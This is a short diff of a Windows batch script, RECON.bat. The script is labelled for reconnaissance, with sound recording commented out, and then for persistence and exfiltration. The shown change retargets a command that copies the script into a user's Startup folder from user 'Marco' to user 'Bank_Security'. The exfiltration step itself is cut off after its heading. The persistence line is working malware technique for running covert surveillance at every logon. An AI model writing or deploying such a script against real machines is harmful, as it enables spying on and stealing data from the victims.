@@ -33,7 +33,7 @@ REM soundrecorder /FILE C:\Windows\Temp\audio.wma /DURATION 00:00:10
 REM echo SOUND RECORDED
 
 echo SET PERSISTENCE
-copy C:\Windows\Temp\RECON.bat "C:\Users\Marco\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RECON.bat" 
+copy C:\Windows\Temp\RECON.bat "C:\Users\Bank_Security\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RECON.bat" 
 echo PERSISTENCE DONE
 
 echo START EXFILTRATION
